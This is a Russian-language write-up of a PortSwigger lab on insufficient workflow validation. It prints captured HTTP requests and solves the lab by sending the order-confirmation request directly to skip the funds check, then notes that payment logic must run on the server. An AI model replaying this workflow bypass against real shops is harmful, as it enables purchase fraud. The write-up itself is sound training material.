лаба https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation
#### Недостаточная проверка рабочего процесса
в лабе есть ошибка в покупках
нужно купить куртку

-------

обычный магазин , без промокодов итд

вот запрос для добавления товара в корзину
```http
POST /cart HTTP/2
Host: 0a9200db03b6c90982b36f6b000b005e.web-security-academy.net
Cookie: session=bcgn5HspcZjBljlIM6tblE9kfpMChEO4
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0a9200db03b6c90982b36f6b000b005e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9200db03b6c90982b36f6b000b005e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

productId=1&redir=PRODUCT&quantity=1
```


в отриц баланс уйти не получается

вот запрос на покупку когда денег хватает
```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a9200db03b6c90982b36f6b000b005e.web-security-academy.net
Cookie: session=bcgn5HspcZjBljlIM6tblE9kfpMChEO4
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a9200db03b6c90982b36f6b000b005e.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

а вот тот же запрос - но когда денег на карте недостаточно

```http
GET /cart?err=INSUFFICIENT_FUNDS HTTP/2
Host: 0a9200db03b6c90982b36f6b000b005e.web-security-academy.net
Cookie: session=bcgn5HspcZjBljlIM6tblE9kfpMChEO4
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a9200db03b6c90982b36f6b000b005e.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

может можно подменить запрос?

когда денег в корзине достаточно - то сайт формирует такой запрос

GET /cart/order-confirmation?order-confirmed=true HTTP/2

а если денег не хватает - то формируется запрос 
GET /cart?err=INSUFFICIENT_FUNDS HTTP/2

по сути - сайт не должен принимать такие решения

----

добавляю в корзину товары , в т ч и куртку

но отправляю тот запрос 
GET /cart/order-confirmation?order-confirmed=true HTTP/2
который подтверждает покупку1

#### ЛАБА РЕШЕНА

----

главная ошибка в разработке этой системы в том, 
что здесь код сайта проверяет состояние корзины и высчитывает, 
можно ли оплатить или нет
и уже на сервер готовую инфу отправляет

это невероятно опасно

все вычисления должны производиться на сервере!












